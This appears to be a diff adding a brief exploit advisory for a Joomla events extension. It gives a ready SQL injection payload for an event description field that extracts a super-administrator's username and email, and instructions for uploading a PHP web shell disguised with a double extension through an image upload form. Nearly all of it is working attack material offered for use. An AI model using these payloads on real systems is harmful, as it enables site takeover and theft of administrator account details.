@@ -1,0 +1,21 @@
+SQL Injection
+-------------
+
+requires: magic quotes OFF, user account
+
+Add this as the description of a new event:
+
+'), ( 63,(SELECT CONCAT(username,0x20,email) FROM #__users WHERE gid=25 
+LIMIT 1),1,1,1) -- '
+
+NOTE: 63 MUST be your Joomla user ID. extracted info can be found on 
+View Events page
+
+
+Remote File Inclusion
+---------------------
+
+requires: user account
+
+Just upload your PHP shell (shell.jpg.php) through the Add Image screen, 
+and find it's new URL in the View Images screen.
